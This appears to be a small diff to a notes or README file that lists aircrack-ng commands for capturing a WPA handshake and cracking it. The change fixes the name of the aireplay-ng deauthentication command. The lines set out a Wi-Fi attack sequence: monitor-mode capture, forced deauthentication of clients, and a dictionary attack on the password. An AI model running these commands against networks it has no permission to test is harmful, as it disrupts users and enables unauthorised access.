@@ -9,7 +9,7 @@ sudo airodump-ng wlan0mon #see local BSSIDs/ESSIDs
 #run following on one terminal
 sudo airodump-ng -c <channel_number_of_network> --bssid <BSSID of network> -w <output location of captured files> wlan0mon
 #run following on another terminal and wait for handshake capture
-sudo aireplay --deauth <count of deauthentication packets> -a <BSSID of network> wlan0mon
+sudo aireplay-ng --deauth <count of deauthentication packets> -a <BSSID of network> wlan0mon
 #after capture
 sudo aircrack-ng <location of .cap file> -w <dictionary or wordlist>
 ```
